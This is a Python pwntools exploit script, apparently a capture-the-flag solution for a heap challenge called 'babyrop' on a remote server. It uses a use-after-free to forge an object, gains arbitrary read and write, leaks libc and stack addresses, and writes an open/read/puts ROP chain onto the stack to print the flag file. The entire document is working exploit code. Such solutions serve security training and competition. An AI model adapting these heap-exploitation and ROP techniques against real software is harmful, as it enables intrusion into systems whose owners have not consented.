from pwn import *

BIN_NAME = 'babyrop'
REMOTE_ADDR = 'mc.ax'
REMOTE_LIBC_PATH = 'libc.so.6'
REMOTE_PORT = 31245
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def prompt(choice):
    stream.sendlineafter(b': ', choice)

def create(i, l, content):
    if LOCAL is None: return
    prompt(b'C')
    prompt(str(i).encode())
    prompt(str(l).encode())
    stream.sendafter(b': ', content)

def free(i):
    if LOCAL is None: return
    prompt(b'F')
    prompt(str(i).encode())

def read(i):
    if LOCAL is None: return b''
    prompt(b'R')
    prompt(str(i).encode())
    stream.recvuntil(b'Sending ')
    l = int(stream.recvuntil(b' ', drop=True))
    stream.recvline()
    res = b''
    content = [int(x, 16) for x in stream.recvline(keepends=False)[1:].split()]
    assert len(content) == l
    return b''.join([(x).to_bytes(1, "little") for x in content])

def write(i, content):
    if LOCAL is None: return
    prompt(b'W')
    prompt(str(i).encode())
    stream.sendafter(b': ', content)

create(0, 0x100, b'\xde\xad\xbe\xef')
create(1, 0x100, b'\xde\xad\xbe\xef')
create(2, 16, b'AAAA')
free(0)
free(1)
create(1, 17, b'\xca\xfe\xba\xbe')

def fakeobj(addr, len):
    write(1, p64(len) + p64(addr))

def aar(addr, len):
    fakeobj(addr, len)
    return read(0)

def aaw(addr, content):
    fakeobj(addr, len(content))
    write(0, content)

stdout_addr = u64(aar(0x404020, 8))

libc = ELF(REMOTE_LIBC_PATH)
libc.address = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
print(f'{hex(libc.address)=}')

stack_addr = u64(aar(libc.symbols["environ"], 8))
print(f'{hex(stack_addr)=}')

FLAG_TXT_ADDR = 0x404000
FLAG_ADDR = 0x4040a0

aaw(FLAG_TXT_ADDR, b'./flag.txt')

rop = ROP(libc)

rop.call('open', [FLAG_TXT_ADDR, 0])
rop.call('read', [3, FLAG_ADDR, 100])
rop.call('puts', [FLAG_ADDR])
rop.call('fflush', [libc.symbols["_IO_2_1_stdout_"]])
rop.call('read', [0, FLAG_ADDR, 30])

print(rop.dump())
aaw(stack_addr - 320, rop.chain())
# aaw(stack_addr - 0x1000, p64(0x401618) * 0x200)

# pause()
stream.sendline(b'E')
stream.sendline(b'0')

stream.interactive()
